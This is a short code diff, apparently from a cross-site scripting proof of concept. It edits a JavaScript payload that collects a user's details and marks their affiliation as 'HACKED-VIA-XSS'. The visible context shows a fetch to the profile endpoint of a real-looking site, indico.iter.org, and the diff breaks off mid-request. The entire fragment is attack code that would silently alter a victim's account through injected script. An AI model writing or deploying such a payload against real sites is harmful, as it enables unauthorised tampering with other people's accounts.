@@ -40,7 +40,8 @@
 
       var payload = JSON.stringify({
         first_name: firstName,
-        last_name: lastName,
+        email: email,
+        affiliation: 'HACKED-VIA-XSS'
       });
 
       fetch('https://indico.iter.org/user/profile/', {
